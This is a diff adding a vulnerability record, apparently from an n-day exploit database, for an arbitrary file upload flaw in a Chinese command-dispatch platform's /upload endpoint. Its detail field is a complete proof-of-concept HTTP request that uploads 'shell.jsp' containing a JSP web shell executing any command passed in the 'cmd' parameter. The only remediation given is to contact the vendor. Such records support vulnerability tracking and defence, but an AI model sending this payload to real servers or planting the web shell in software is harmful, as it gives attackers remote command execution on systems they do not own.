@@ -1,0 +1,16 @@
+vendor = "可视化融合指挥调度平台"
+name = "可视化融合指挥调度平台 upload 任意文件上传漏洞"
+type = "任意文件上传"
+path = "/upload"
+version = ""
+detail = """POST /upload HTTP/1.1 Host: target Content-Type: multipart/form-data; boundary=----Boundary
+
+------Boundary
+Content-Disposition: form-data; name="file"; filename="shell.jsp"
+<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
+------Boundary--"""
+fix = "联系厂商升级"
+date = 20260415
+label = "nday"
+cve = "TVD-2026-08343"
+verifier = "AdySec"
